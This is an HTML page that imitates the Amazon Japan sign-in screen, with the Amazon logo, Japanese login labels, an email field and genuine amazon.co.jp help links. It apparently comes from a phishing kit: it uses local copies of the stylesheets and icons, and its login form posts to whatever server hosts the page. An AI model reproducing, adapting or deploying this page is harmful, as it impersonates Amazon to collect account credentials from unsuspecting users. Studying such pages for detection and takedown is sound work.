<!DOCTYPE html>
<html>
<head>
<meta charset='utf-8'>
<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, user-scalable=no">
<title>Amazonサインイン</title>
<link href="https://use.fontawesome.com/releases/v6.2.0/css/all.css" rel="stylesheet">
<link rel="stylesheet" href="reset.css">
<link rel='stylesheet' type='text/css' href='style.css'>
<link rel="icon" href="mini-icon.ico">
<link rel="apple-touch-icon" sizes="180x180" href="apple-touch-icon.png">
</head>
<body>
	<div id="page">
		<div id="header">
			<a tabindex="-1" href="https://www.amazon.co.jp/ref=ap_frn_logo">
				<i id="logo" role="img" aria-label="Amazon"></i>
				<i id="domain" role="presentation"></i>
			</a>
		</div>
		<div id="middle">
			<form name="signIn" method="post" novalidate="" action="" id="login">
				<div class="section">
					<div id="box">
						<h1>ログイン</h1>
						<div id="address">
							<label for="ap_email">Eメールまたは携帯電話番号</label>
							<input type="email" maxlength="128" id="ap_email" name="email" tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field">
							<div id="alert" style="display: none;"><i class="a-icon a-icon-alert"></i><div class="a-alert-content">メールアドレスまたは携帯電話番号を入力してください</div></div>
						</div>
						<div id="next">
							<span id="continue">
								<span class="button-inner">
									<input id="button-input" tabindex="5" type="submit" aria-labelledby="button-text">
									<span class="button-text" aria-hidden="true">次に進む</span>
								</span>
							</span>
							<div id="legalTextRow">
								Amazonの<a href="https://www.amazon.co.jp/gp/help/customer/display.html/ref=ap_signin_notification_condition_of_use?ie=UTF8&nodeId=643006">利用規約</a>と<a href="/gp/help/customer/display.html/ref=ap_signin_notification_privacy_notice?ie=UTF8&amp;nodeId=643000">プライバシー規約</a>に同意いただける場合はログインしてください。
							</div>
						</div>
						<div id="question">
							<a data-csa-c-func-deps="aui-da-a-expander-toggle" data-csa-c-type="widget" data-csa-interaction-events="click" aria-expanded="false" role="button" href="javascript:void(0)" data-action="a-expander-toggle" data-a-expander-toggle="{&quot;allowLinkDefault&quot;:true, &quot;expand_prompt&quot;:&quot;&quot;, &quot;collapse_prompt&quot;:&quot;&quot;}" data-csa-c-id="dnbwwg-pd0l9z-228yzr-2xt07m"><i class="a-icon a-icon-expand"></i><span class="a-expander-prompt">お困りですか?</span></a>
							<div aria-expanded="false" class="a-expander-content a-expander-inline-content a-expander-inner" style="display:none">
								<a id="auth-fpp-link-bottom" class="link-normal" href="https://www.amazon.co.jp/ap/forgotpassword?showRememberMe=true&amp;openid.pape.max_auth_age=0&amp;openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;pageId=jpflex&amp;ignoreAuthState=1&amp;mobileBrowserWeblabTreatment=C&amp;openid.return_to=https%3A%2F%2Fwww.amazon.co.jp%2Fgp%2Fcss%2Fhomepage.html%3Fref_%3Dnav_youraccount_switchacct&amp;prevRID=QN6AV0GW3KF921S13PAK&amp;openid.assoc_handle=jpflex&amp;openid.mode=checkid_setup&amp;desktopBrowserWeblabTreatment=C&amp;prepopulatedLoginId=&amp;failedSignInCount=0&amp;ref_=ap_sw_aa&amp;openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;disableLoginPrepopulate=1&amp;switch_account=signin&amp;openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0">パスワードを忘れた場合</a>
							</div>
							<div aria-expanded="false" class="a-expander-content a-expander-inline-content a-expander-inner" style="display:none">
								<a id="ap-other-signin-issues-link" class="link-normal" href="/gp/help/customer/account-issues/ref=ap_login_with_otp_claim_collection?ie=UTF8">その他のログインに関する問題</a>
							</div>
						</div>
					</div>
				</div>
			</form>
			<div id="beginner"><h5 aria-level="5">初めてAmazonをご利用ですか？</h5></div>
			<span id="create-account"><span class="button-inner"><a href="https://www.amazon.co.jp/ap/register?showRememberMe=true&amp;openid.pape.max_auth_age=0&amp;openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;pageId=jpflex&amp;ignoreAuthState=1&amp;mobileBrowserWeblabTreatment=C&amp;openid.return_to=https%3A%2F%2Fwww.amazon.co.jp%2Fgp%2Fcss%2Fhomepage.html%3Fref_%3Dnav_youraccount_switchacct&amp;prevRID=QN6AV0GW3KF921S13PAK&amp;openid.assoc_handle=jpflex&amp;openid.mode=checkid_setup&amp;desktopBrowserWeblabTreatment=C&amp;prepopulatedLoginId=&amp;failedSignInCount=0&amp;ref_=ap_sw_aa&amp;openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;disableLoginPrepopulate=1&amp;switch_account=signin&amp;openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0" class="button-text">Amazonアカウントを作成する</a></span></span>
		</div>
		<div id="right-2"></div>
		<div id="footer">
			<div id="divider-inner"></div>
			<div id="auth-footer" class="section spacing-small text-center size-mini">
				<span></span>
				<a target="_blank" href="/gp/help/customer/display.html/ref=ap_desktop_footer_cou?ie=UTF8&amp;nodeId=643006">利用規約</a>
				<span></span>
				<a target="_blank" href="/gp/help/customer/display.html/ref=ap_desktop_footer_privacy_notice?ie=UTF8&amp;nodeId=643000">プライバシー規約</a>
				<span></span>
				<a target="_blank" href="/help">ヘルプ</a>
				<span></span>
			</div>
			<div id="rights-footer" class="section text-center">
				<span class="size-mini">© 1996-2023, Amazon.com, Inc. またはその関連会社</span>
			</div>
		</div>
	</div>
</body>
</html>
